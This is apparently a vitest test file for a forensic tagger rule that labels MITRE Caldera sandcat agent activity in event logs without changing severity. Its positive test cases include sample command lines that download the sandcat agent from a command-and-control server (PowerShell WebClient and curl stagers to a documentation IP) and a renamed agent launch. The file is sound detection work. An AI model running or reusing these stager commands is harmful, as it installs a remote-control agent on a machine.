import { describe, it, expect } from "vitest";
import { readFileSync } from "node:fs";
import { fileURLToPath } from "node:url";
import { compileText } from "../../src/analysis/taggerStore.js";
import { runTagger, applyToForensicEvent } from "../../src/analysis/tagger.js";
import type { ForensicEvent, Severity } from "../../src/analysis/stateTypes.js";

// #1957: a MITRE Caldera sandcat agent is tagged `emulation-framework-agent` as a FACT. The rule has
// no severity, so every row keeps its import grade. It reads file/process names and launch
// arguments only, never free text: a comment or description that names sandcat does not fire.
const RULESET = compileText(
  readFileSync(fileURLToPath(new URL("../../data/tags.yaml", import.meta.url)), "utf8"),
);
const RULE_ID = "emulation_framework_agent";

function ev(fields: Partial<ForensicEvent>, severity: Severity = "Medium"): ForensicEvent {
  return {
    id: "e1",
    timestamp: "2026-06-01T00:00:00Z",
    description: "Process created",
    severity,
    mitreTechniques: [],
    relatedFindingIds: [],
    sourceScreenshots: [],
    sources: ["Sysmon"],
    ...fields,
  };
}

function tag(event: ForensicEvent): { tagged: boolean; severity: string; tags: string[] } {
  const proposal = runTagger([event], RULESET).perEvent.find((p) => p.eventId === event.id);
  const tagged = proposal?.ruleIds.includes(RULE_ID) ?? false;
  const after = proposal ? applyToForensicEvent(event, proposal) : event;
  return { tagged, severity: after.severity, tags: proposal?.tags ?? [] };
}

describe("bundled data/tags.yaml — emulation framework agent (#1957)", () => {
  it("loads the rule as tags-only: no severity, no MITRE", () => {
    const rule = RULESET.rules.find((r) => r.id === RULE_ID);
    expect(rule).toBeDefined();
    expect(rule?.severity).toBeUndefined();
    expect(rule?.tags).toEqual(["emulation-framework-agent"]);
    expect(rule?.mitre ?? []).toEqual([]);
  });

  describe("tags the row and keeps its severity", () => {
    const POSITIVES: [string, Partial<ForensicEvent>, Severity][] = [
      [
        "the issue's renamed agent launch",
        { commandLine: "C:\\Users\\Public\\splunkd.exe -server http://x:8888 -group red" },
        "Medium",
      ],
      [
        "quoted server and group values",
        {
          commandLine:
            'C:\\Users\\Public\\splunkd.exe -server "http://192.0.2.10:8888" -group "rtlo_group" -v',
        },
        "High",
      ],
      [
        "a PowerShell variable as the server",
        { commandLine: "Start-Process -FilePath $agent -ArgumentList '-server $server -group red'" },
        "Low",
      ],
      ["a sandcat file path", { path: "C:\\Users\\Public\\sandcat.exe" }, "High"],
      ["an MFT device path", { path: "\\\\.\\C:\\Users\\Public\\sandcat.exe" }, "Medium"],
      ["a sandcat process name", { processName: "sandcat.go-windows" }, "Info"],
      [
        "a stager fetch with a platform header",
        {
          commandLine:
            'powershell -c "$wc.Headers.add(\\"platform\\",\\"windows\\"); $wc.DownloadData(\\"http://192.0.2.10:8888/file/download\\")"',
        },
        "Medium",
      ],
      [
        "a curl stager with file: header",
        {
          commandLine:
            'curl -s -X POST -H "file:sandcat.go" -H "platform:linux" http://192.0.2.10:8888/file/download',
        },
        "Low",
      ],
    ];
    it.each(POSITIVES)("%s", (_name, fields, severity) => {
      const r = tag(ev(fields, severity));
      expect(r.tagged).toBe(true);
      expect(r.tags).toContain("emulation-framework-agent");
      expect(r.severity).toBe(severity);
    });
  });

  describe("does not tag", () => {
    const NEGATIVES: [string, Partial<ForensicEvent>][] = [
      ["-server with no -group", { commandLine: "splunkd.exe -server http://x:8888" }],
      ["-group with no -server", { commandLine: "net localgroup -group red" }],
      ["a comment that names sandcat", { description: "# deploy sandcat agent to the lab" }],
      [
        "a description that carries the launch shape",
        { description: "Shell command: .\\splunkd.exe -server http://x:8888 -group red" },
      ],
      ["a message that names sandcat", { message: "sandcat.exe downloaded by the operator" }],
      ["a bare /file/download URL", { commandLine: '$url="$server/file/download";' }],
      [
        "a /file/download fetch with no platform/file header",
        { commandLine: "curl -s http://192.0.2.10/file/download -o out.bin" },
      ],
      ["a file that only contains sandcat in its name", { path: "C:\\tools\\notsandcat.exe" }],
    ];
    it.each(NEGATIVES)("%s", (_name, fields) => {
      expect(tag(ev(fields)).tagged).toBe(false);
    });
  });
});
